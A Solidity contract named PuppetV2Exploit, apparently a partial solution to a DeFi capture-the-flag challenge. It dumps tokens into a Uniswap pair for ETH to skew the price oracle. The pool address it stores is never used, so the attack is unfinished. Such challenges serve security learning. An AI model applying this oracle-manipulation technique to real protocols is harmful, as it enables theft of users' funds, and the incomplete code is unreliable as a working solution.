// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address, uint256) external;
}

interface IUniswapRouter {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function WETH() external pure returns (address);
}

contract PuppetV2Exploit {

    IERC20 _weth;
    IERC20 _token;
    address _uniswapPair;
    address _uniswapFactory;
    address _player;
    address _pool;
    address _router;
    constructor(address weth, address token, address pair, 
        address factory, address player, address pool, address router) public {
        _weth = IERC20(weth);
        _token = IERC20(token);
        _uniswapPair = pair;
        _uniswapFactory = factory;
        _player = player;
        _pool = pool;
        _router = router;
    }

    function swapTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin
        ) external {
        // Approve the router to spend the tokens
        // Assuming the Token contract has an `approve` function
        _token.approve(_router, amountIn);
        
       // Path of token addresses for swapping, e.g., [tokenAddress, WETH]
       address[] memory path = new address[](2);
       path[0] = address(_token);
       path[1] = IUniswapRouter(_router).WETH();
       
       // Perform the swap
       IUniswapRouter(_router).swapExactTokensForETH(
           amountIn,
           amountOutMin,
           path,
           _player,
           block.timestamp * 2
       );
    }

    function test() public view returns (address) {
        return IUniswapRouter(_router).WETH();
    }

}